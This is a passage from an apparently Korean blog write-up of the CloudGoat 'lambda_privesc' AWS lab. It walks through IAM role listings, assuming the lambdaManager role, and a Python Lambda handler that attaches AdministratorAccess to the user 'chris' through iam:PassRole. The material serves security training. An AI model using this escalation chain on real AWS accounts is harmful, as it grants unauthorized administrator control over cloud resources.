string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"Service\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"rds.amazonaws.com\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allows Amazon RDS to manage AWS resources on your behalf\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/aws-service-role/support.amazonaws.com/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AWSServiceRoleForSupport\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI52DTL4XEGY\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::712987748923:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2020-09-10T02:27:38+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"Service\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"support.amazonaws.com\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Enables resource access for AWS to provide billing, administrative and support services\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/aws-service-role/trustedadvisor.amazonaws.com/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AWSServiceRoleForTrustedAdvisor\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI5WDUNGWNAK\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::712987748923:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2020-09-10T02:27:38+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"Service\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"trustedadvisor.amazonaws.com\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Access for the AWS Trusted Advisor Service to help reduce cost, increase performance, and improve security of your AWS environment.\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-debug-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI566QQGU2JJ\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::712987748923:role/cg-debug-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T01:11:47+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Sid\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"Service\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"lambda.amazonaws.com\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI52NOERA357\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::712987748923:role/cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T01:11:56+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Sid\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"AWS\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::712987748923:user/chris-lambda_privesc_cgidejvizwx9mo\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"lambda-manager-debug-정책-조회-및-분석\" style=\"position:relative;\"><a href=\"#lambda-manager-debug-%EC%A0%95%EC%B1%85-%EC%A1%B0%ED%9A%8C-%EB%B0%8F-%EB%B6%84%EC%84%9D\" aria-label=\"lambda manager debug 정책 조회 및 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lambda Manager, debug 정책 조회 및 분석</h3>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">lambdaManager\n<span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::712987748923:role/cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n\nDebug\n<span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-debug-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::712987748923:role/cg-debug-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span></code></pre></div>\n<ul>\n<li>앞에서 분석하였던 두 데이터를 통해 각각 접근된 정책들에대해 조회를 하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAY0lEQVQI112M2QqAIBREzValVbti0WLRU/T/vzeRUQ8+HDjMwGFlPWJeT6zbBU0OZHYocpgqB1MtSAUhLwi5MMgK8jwe8u1MlhadWmDsAd2/wScsm8HHeNKB8cYTxe3vId93Aw22LskuGqKNAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4\"\n        title=\"4\"\n        src=\"/static/e265399ee763a12855bdc0aafac62600/37523/4.png\"\n        srcset=\"/static/e265399ee763a12855bdc0aafac62600/e9ff0/4.png 180w,\n/static/e265399ee763a12855bdc0aafac62600/f21e7/4.png 360w,\n/static/e265399ee763a12855bdc0aafac62600/37523/4.png 720w,\n/static/e265399ee763a12855bdc0aafac62600/302a4/4.png 1080w,\n/static/e265399ee763a12855bdc0aafac62600/07a9c/4.png 1440w,\n/static/e265399ee763a12855bdc0aafac62600/fde66/4.png 1574w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBElEQVQY002Q707CQBDED2iLBtpe76hE6PUPVA22BUEjJGiEDzyD7/8kP9OjJH6YzMxuNju74vllw7KsuXFinkhMSV6syMtXLvE7v/cfTIMMXxmUzpk8LCzi6ZJAGtQkR8fXmhj5M1sc+XP6ToToy45DhAgQTgsfMZD0Bl1P+Agx7vBP9wKEdxczNysW5Rs6LkiyijSvyYoGk1UUxZo0rWy/WG7IF2ubJNIZUqVIldmEgUyuyyKdEkYJUhnLfjhjHDwSyjmRMtY7nsYdTnCHmoGrrG6D3Pim2wvE6Xzh+HXm53ThcPimbnbUzZbtbs/n/khd73A8ZV/Q6862g523r+l0m/APc3B9ea63FDgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"5\"\n        title=\"5\"\n        src=\"/static/e5d1d8ff43eceab174d7615ac8ef4c3c/37523/5.png\"\n        srcset=\"/static/e5d1d8ff43eceab174d7615ac8ef4c3c/e9ff0/5.png 180w,\n/static/e5d1d8ff43eceab174d7615ac8ef4c3c/f21e7/5.png 360w,\n/static/e5d1d8ff43eceab174d7615ac8ef4c3c/37523/5.png 720w,\n/static/e5d1d8ff43eceab174d7615ac8ef4c3c/302a4/5.png 1080w,\n/static/e5d1d8ff43eceab174d7615ac8ef4c3c/26a94/5.png 1102w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>두 정책 역시 정책 ARN 정보와 관리자급에 대한 권한임을 유추할 수 있습니다. 이를 이용하여 lambda 기능을 전부 관리할 수 있는 manager이자 <code class=\"language-text\">iam:PassRole</code> 이기 때문입니다.</li>\n<li>그렇다면은 lambda의 <code class=\"language-text\">CreateFunction</code> , <code class=\"language-text\">InvokeFunction</code> 을 통해서 권한 상승이 가능해집니다.</li>\n<li>이는 lambda 코드를 작성할시 AWS 라이브러리를 가져오는 코드가 포함되어 새로운 lambda 함수 에 기존 IAM Rule을 전하기 때문입니다.</li>\n<li>AWS API를 통해서 함수를 호출하여 코드를 실행하게되면 계정에 존재하는 모든 lambda 서비스 rule과 attached된 권한에 대한 액세스 권한이 사용자에게 부여가 될 수있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 39.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABF0lEQVQoz5WS226CQBRFDxclSGFgBqUEuSmKoG1E2ybat/ahP9D//5XdzFRsfGnwYWdmcnLWueyh8/snTucP7J7fsO9OaLZHFGWDTdOhbjusii2+xBHf7iuySY4HnoKLAjwswYIMLpsjEAU8P0UgcpA5FkjSFtX6AJ/nsOwI5jiEZgTQDB9ELkhzQLqUB9IYSPP+pLPbU16MEUdePmGetRDTUlW07Bl0M1AyTa5kXN7/ia4XmmAaLVHVB9VtFK9UIdmlPgB05fQJMtl2HrGo9siKHeQq+tg9UOoT5Py2E8FxY4ys8BJkN9AhYCLykKQN1psXxEmt3HNZoqByj/eOrVyWlkuYzzOI2QJhtFTfgYe/5shOhwJ/ADJ8usvHFVbHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"6\"\n        title=\"6\"\n        src=\"/static/9cecd84e5460ded2e9e6500652e7bbfa/37523/6.png\"\n        srcset=\"/static/9cecd84e5460ded2e9e6500652e7bbfa/e9ff0/6.png 180w,\n/static/9cecd84e5460ded2e9e6500652e7bbfa/f21e7/6.png 360w,\n/static/9cecd84e5460ded2e9e6500652e7bbfa/37523/6.png 720w,\n/static/9cecd84e5460ded2e9e6500652e7bbfa/f53a0/6.png 1062w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>접근이 불가능한 AWS 리소스에 액세스 하기 위해서 임시 Credential을 사용하기 위해서 <code class=\"language-text\">assum-role</code> 을 통해 해당 구성요소들을 획득할 수 있습니다.</li>\n<li>ARN 에 해당하는 권한들 과 이에 대한 참조되는 권한 리소스에 접근을 할 수 가 있습니다.</li>\n<li>디버그 에 해당 하는 권한을 chris가 맡기 위해서는 rule에 해당하는 정보가 없기 때문에 lambdaManager에 해당하는 <code class=\"language-text\">assum-role</code>을 적용합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABIElEQVQY03WRW3OCMBCFeaki4LWgEMKlrUgCtlOrgFovndZOr///75zOhkGf+nBmz9nM7uRLtNvpA/J5CZEtIfMCUZyB8RnCWOLaiTAY+mjpNlq6A92YoN0ZK0+1yYblwrA8lTVNs+BxgcXqiDC+Bw8ziLxCNl/jLlnAZSn8QCKM5+gNAnTMepjUMScwu+ySLRfaTKxQbU44vPxgu/vA8/4Tx9df7I/fSpRJdNao3JxQrt+Up9n19h27w5fKGuMCIivw+LRHKguIrITMK9WjW7psdsbUjRqTfJNrfAdXbfuC7EymSNKlwhvZNwqRBRJjN1GiPBhFCpdEmITboJpdD90+rxe6bArPT5SCSKpKPfoY8jxI0R/y81v9t9Dq+ar3B2IqomBn5ZSoAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"7\"\n        title=\"7\"\n        src=\"/static/8484b5ba67ae631b7e3caf173b9d8b0a/37523/7.png\"\n        srcset=\"/static/8484b5ba67ae631b7e3caf173b9d8b0a/e9ff0/7.png 180w,\n/static/8484b5ba67ae631b7e3caf173b9d8b0a/f21e7/7.png 360w,\n/static/8484b5ba67ae631b7e3caf173b9d8b0a/37523/7.png 720w,\n/static/8484b5ba67ae631b7e3caf173b9d8b0a/302a4/7.png 1080w,\n/static/8484b5ba67ae631b7e3caf173b9d8b0a/3fca6/7.png 1112w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 만료시간이 정해져있는 세션 토큰 정보를 수동으로 AWS profile 에 등록을 진행합니다</li>\n<li>세션 토크은 만료 시간이 정해져 있기 때문에 해당 시가내에 수동으로 입력하고 사용해야 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA3ElEQVQY002QS3OCQBCE92B5iAta5hAFRI0uIMFCFrUUF1cxFYmP5JD//1vacnxUDlNfd19methssUOSajjdD7QsD93+GENPQvgSb20Bo27TcNOG2eigUn0FYxyMGffh/8jB/NEMQTjH0JfwghSxzBEnCtN5ATnVCKMF+SjOaPFAJLTY7ozQtoM7faLjhmBf5R+Kz19sijO2u5+nVutv8uvNEau8pGyp9lD6luf6gCwvkak9ab09kWa3einVdHsRXfAuJlT9yv4gRqPpUuUX3oJRd54vqBkWZQ995QXgBHUNsX8iPgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"8\"\n        title=\"8\"\n        src=\"/static/31212bdf10a7d5b9d49e27deb59e9340/37523/8.png\"\n        srcset=\"/static/31212bdf10a7d5b9d49e27deb59e9340/e9ff0/8.png 180w,\n/static/31212bdf10a7d5b9d49e27deb59e9340/f21e7/8.png 360w,\n/static/31212bdf10a7d5b9d49e27deb59e9340/37523/8.png 720w,\n/static/31212bdf10a7d5b9d49e27deb59e9340/40601/8.png 945w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"관리자-정책-권한을-iam-user-chris에-연결할-lambda-함수-생성\" style=\"position:relative;\"><a href=\"#%EA%B4%80%EB%A6%AC%EC%9E%90-%EC%A0%95%EC%B1%85-%EA%B6%8C%ED%95%9C%EC%9D%84-iam-user-chris%EC%97%90-%EC%97%B0%EA%B2%B0%ED%95%A0-lambda-%ED%95%A8%EC%88%98-%EC%83%9D%EC%84%B1\" aria-label=\"관리자 정책 권한을 iam user chris에 연결할 lambda 함수 생성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>관리자 정책 권한을 IAM User: Chris에 연결할 Lambda 함수 생성</h3>\n<ul>\n<li>python 언어를 선택해서 lambda 기능을 사용할 함수를 구성하였습니다</li>\n<li><code class=\"language-text\">boto3</code> 모듈은 AWS SDK에 해당하고 AWS CLI를 설치하였다면 같은 의존성에 의해 같이 설치가 되었을 것 입니다.</li>\n<li>AWS EC2, AWS S3 등과 같은 AWS 서비스를 생성, 구성 관리를 할 수 있으며 다양한 AWS 서비스에 대한 Low-level 수준의 액세스를 제공해줍니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAiUlEQVQY062MWwuCQBhE9xK5l89Ncdd0pSIRhN7z//+zCZcVKqInHw4zw8Bh3fmOy/zEOC+4XR8I3QRyA8hFaBVgM0b53D2UbmHKCLNm4dO3QiqAaeMRmgFNO8JSD0M9bBmT9FtIuf8VyqMH4w5MnD5z67L6ne//RtpFgJAVxKHehSTkWch3EL8A4cNwka4HXtcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"9\"\n        title=\"9\"\n        src=\"/static/3e270db1ea353ea751b3e528108e2deb/37523/9.png\"\n        srcset=\"/static/3e270db1ea353ea751b3e528108e2deb/e9ff0/9.png 180w,\n/static/3e270db1ea353ea751b3e528108e2deb/f21e7/9.png 360w,\n/static/3e270db1ea353ea751b3e528108e2deb/37523/9.png 720w,\n/static/3e270db1ea353ea751b3e528108e2deb/302a4/9.png 1080w,\n/static/3e270db1ea353ea751b3e528108e2deb/48ca3/9.png 1084w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> boto3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">lambda_handler</span><span class=\"token punctuation\">(</span>evt<span class=\"token punctuation\">,</span> cont<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tcli <span class=\"token operator\">=</span> client<span class=\"token punctuation\">(</span><span class=\"token string\">'iam'</span><span class=\"token punctuation\">)</span>\n\tresp <span class=\"token operator\">=</span> cli<span class=\"token punctuation\">.</span>attach_user_policy<span class=\"token punctuation\">(</span>\n\t\t\t\t\t\t\t\t\t\t\tUserName<span class=\"token operator\">=</span><span class=\"token string\">'chris-lambda_privesc_cgidejvizwx9mo'</span><span class=\"token punctuation\">,</span>\n\t\t\t\t\t\t\t\t\t\t\tPolicyArn<span class=\"token operator\">=</span><span class=\"token string\">'arn:aws:iam::aws:policy/AdministratorAccess'</span>\n\t<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> resp\n\t\t</code></pre></div>\n<ul>\n<li><code class=\"language-text\">iam</code> 서비스를 이용하여 <code class=\"language-text\">chris</code> 사용자에게 debug 관리 정책을 연결할 예정이기 때문에 다음과 같이 <code class=\"language-text\">attach_user_policy</code> 메서드를 사용하여 해당 인스턴스를 생성할 수 있도록 설계를 하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: 